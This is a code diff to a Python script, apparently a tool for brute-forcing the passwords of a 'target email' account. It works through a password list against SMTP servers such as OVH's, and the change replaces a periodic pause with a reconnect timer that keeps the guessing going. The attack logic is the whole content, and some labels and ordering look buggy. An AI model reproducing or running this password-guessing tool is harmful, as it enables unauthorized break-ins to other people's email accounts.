@@ -1,10 +1,19 @@
 #!/usr/bin/python
 '''create by MAVERIKGOLD'''
 
+
+
+
+
+
+
+
+
 import smtplib
 from os import system
 from time import sleep
 import time
+import threading
 
 
 def StartMessage():
@@ -41,7 +50,7 @@ def ChoiseSMTP():
         print 'your choise is : ARUBA SMTP', semtp_custom_address, ' port : ' , semtp_custom_port
 
     if option == 3:
-        print 'your choise is : OVH'
+        print 'your choise is : ARUBA'
         semtp_custom_address = 'SSL0.OVH.NET'
         semtp_custom_port = '465'
         print 'your choise is : ARUBA SMTP', semtp_custom_address, ' port : ' , semtp_custom_port
@@ -65,12 +74,23 @@ def FilePath():
     pass_list = pass_file.readlines()
 
 
+import threading
+
+
+def timer():
+    threading.Timer(20.0, timer).start()
+    print("recall!")
+    server = smtplib.SMTP_SSL(semtp_custom_address, int(semtp_custom_port))
+    server.ehlo()
+
+
+timer()
 
 FilePath()
 
 def Dologin():
     i = 0
-    a = 0
+
 
     print '\n'
     user_name = raw_input('target email :')
@@ -79,13 +99,9 @@ def Dologin():
     for password in pass_list:
 
         i = i + 1
-        a = a + 1
-        if a == 2000:
-           a = 0
-           print'pausa tattica'
-           time.sleep(1)
-           server = smtplib.SMTP_SSL(semtp_custom_address, int(semtp_custom_port))
-           server.ehlo()
+
+
+
         print str(i) + '/' + str(len(pass_list))
 
         try:
